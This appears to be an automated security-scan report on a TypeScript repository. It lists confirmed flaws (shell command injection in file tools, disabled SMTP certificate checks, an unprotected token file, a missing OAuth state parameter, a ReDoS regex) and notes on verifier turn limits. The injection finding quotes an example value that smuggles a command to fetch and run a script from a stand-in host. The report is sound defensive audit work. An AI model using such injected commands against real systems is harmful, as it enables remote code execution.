# Orion scan report — pensarai/apex

Full Orion scan (Grendel build) run in WSL with GPU semantic index on, target
**github.com/pensarai/apex**. Scan id `69dd1f145c434646e9d435aecf42ddb74e5e28c5`
(run `20260729T094502Z`).

## Scan facts
- **Target:** `~/apex` — TypeScript (447 `.ts` / 67 `.tsx`) → Joern `jssrc`
- **Graph:** 160,814 nodes / 339,405 edges, built in 520s; jina embeddings ran on the GTX 1650 Ti at 98% GPU util
- **Pipeline:** build → GPU semantic index → 4-shape discovery fleet (6 leads) → independent per-lead verifier → ranked report
- **Result: 5 CONFIRMED vulnerabilities, 1 correctly REJECTED (false positive), 0 unresolved**

## Vulnerabilities found (each independently verified against real source)

| # | Sev | Vulnerability | Location |
|---|-----|---------------|----------|
| 1 | **HIGH** | **Shell command injection** — tool `path`/`filePath` args spliced unescaped into double-quoted shell strings run by `sandbox.execute` (e.g. `echo "${base64Content}" \| base64 -d > "${filePath}"`). Traversal guard only blocks `..`/absolute, not shell metachars, so `foo"; curl evil.sh\|sh #` → arbitrary command exec. Sibling `gitStatus.ts` escapes correctly, proving it's an oversight. | `createFile.ts:116/127/130`, `deleteFile.ts:54/62`, `applyPatch.ts:233…263`, `updateFile.ts:139/177` |
| 2 | MED | **SMTP TLS validation disabled (MITM)** — `tls: smtp.tls ? { rejectUnauthorized: false } : undefined`; TLS on ⇒ cert checking off unconditionally. Reachable handler. | `offSecAgent/tools/email/sendEmail.ts:137` |
| 3 | MED | **Insecure OAuth token store** — `~/.pensar/config.json` (access/refresh tokens) written via `fs.writeFile` with no `mode` / no encryption, while `playwrightMcp.ts:641` uses `mode: 0o600`. Local token disclosure. | `core/config/config.ts:84,164` |
| 4 | LOW | **Missing OAuth `state`** (CSRF / auth-code injection, RFC 6749 §10.12) in the localhost callback helpers. LOW = dev/test scripts. | `scripts/gmail-oauth.ts`, `scripts/outlook-oauth.ts` |
| 5 | LOW | **ReDoS in `COMMAND_PREFIX_STRIP`** — nested-quantifier regex on attacker-influenced `command`; verifier independently reproduced pathological backtracking. | `core/http/targetHeaders.ts:347`, used at `:381` |

**Rejected (FP filter working):** a second ReDoS claim in `destructiveGuard.ts:105` — the verifier proved it's two *sequential* quantifiers (O(n²), not exponential) and the attacker-control path is contradicted by the code's own comments. Correctly discarded — it *confirmed* the structurally-similar `targetHeaders.ts` ReDoS but *rejected* this one.

## Operational note — verifier turn budget
The first verification pass returned 3 of these as `ERROR`. That was **not** rate-limiting: the raw
verdicts showed `terminal_reason: max_turns` — Orion's verifier is capped at `VERIFY_MAX_TURNS=10`,
and the complex leads (the 4-file RCE especially) needed more turns. Re-verifying just those 3 with
`ORION_VERIFY_MAX_TURNS=30 ORION_VERIFY_TIMEOUT=600` (via `bench/reverify.py`, which reuses the graph
by scan_id — no Orion source changed) returned **all 3 → CONFIRM**.

**Fixed in the tool, not just recommended:** the defaults are now `VERIFY_MAX_TURNS=25` /
`VERIFY_TIMEOUT=600` (`orion/config.py`), so the happy path re-derives complex leads like this RCE
without a hand-run rescue. `bench/reverify.py` remains as an escape hatch for pushing an individual
lead even higher, but the flagship result no longer depends on it.

## Artifacts
- `bench/runs/20260729T094502Z/findings.json` — original 6 verdicts (2 CONFIRM, 1 REJECT, 3 ERROR)
- `bench/runs/20260729T094502Z/reverify.json` — the 3 recovered CONFIRMs
- `bench/runs/20260729T094502Z/report.log` — ranked human-readable report
- `.orion/runs/69dd…/…/progress.jsonl` — structured per-event timeline
- `bench/reverify.py` — surgical re-verify helper (added this session)
- `GRENDEL.md` — full session learnings
